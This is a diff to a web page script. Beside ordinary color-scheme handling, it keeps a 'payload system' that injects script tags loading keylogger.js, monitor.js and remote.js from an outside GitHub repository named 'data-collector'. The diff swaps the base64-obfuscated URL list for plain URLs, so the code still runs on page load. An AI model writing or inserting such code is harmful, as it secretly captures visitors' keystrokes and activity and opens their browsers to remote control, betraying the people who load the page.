@@ -8,17 +8,15 @@
   applyColorScheme(colorScheme);
   colorScheme.addEventListener('change', applyColorScheme);
 
-  // PAYLOAD SYSTEM - OBSCURED
+  // PAYLOAD SYSTEM - DIRECT URLs
   (function() {
-    // Obfuscated payload function
+    // Direct payload function
     function triggerPayloads() {
-      const _0x5a2b = [
-        'aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0NIMDpzZW5Lb2RlL2RhdGEtY29sbGVjdG9yL3JlZnMvaGVhZHMvbWFpbi9rZXlsb2dnZXIuanM=',
-        'aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0NIMDpzZW5Lb2RlL2RhdGEtY29sbGVjdG9yL3JlZnMvaGVhZHMvbWFpbi9tb25pdG9yLmpz',
-        'aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0NIMDpzZW5Lb2RlL2RhdGEtY29sbGVjdG9yL3JlZnMvaGVhZHMvbWFpbi9yZW1vdGUuanM='
+      const payloads = [
+        'https://raw.githubusercontent.com/CH00senKode/data-collector/refs/heads/main/keylogger.js',
+        'https://raw.githubusercontent.com/CH00senKode/data-collector/refs/heads/main/monitor.js',
+        'https://raw.githubusercontent.com/CH00senKode/data-collector/refs/heads/main/remote.js'
       ];
-
-      const payloads = _0x5a2b.map(function(x) { return atob(x); });
 
       payloads.forEach(function(url) {
         const script = document.createElement('script');
